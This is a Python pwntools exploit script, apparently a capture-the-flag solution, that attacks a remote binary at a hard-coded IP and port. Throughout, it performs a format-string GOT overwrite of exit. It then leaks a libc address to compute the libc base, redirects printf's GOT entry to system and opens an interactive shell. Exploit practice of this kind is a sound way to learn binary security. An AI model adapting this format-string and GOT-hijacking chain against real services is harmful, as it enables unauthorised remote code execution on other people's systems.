#coding:utf-8
#Author:mcpvioy
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'
io = remote('34.64.203.138',10003)
#io = process('./prob')
elf = ELF('./prob')
libc = ELF('libc6_2.31-0ubuntu9.9_amd64.so')
shell = 0x40049e
exit_got = elf.got['exit']
pl = fmtstr_payload(6,{exit_got:shell})
io.sendline(pl)

pl2 = 'a' * 0x1000
pl3 = 'aaaaaaaa%41$pabcdefgh'
io.send(pl3)
for i in range(11):
	io.sendline('a'*0x100)

libc_start_main = int(io.recvuntil('abcdefgh',drop=True)[-14:],16) - 239
libc_base = libc_start_main - libc.sym['__libc_start_main']
print(hex(libc_start_main))
print(hex(libc_base))

printf_got = elf.got['printf']
system = libc_base + libc.sym['system']

pl = fmtstr_payload(6,{printf_got:system})
io.sendline(pl)

io.interactive()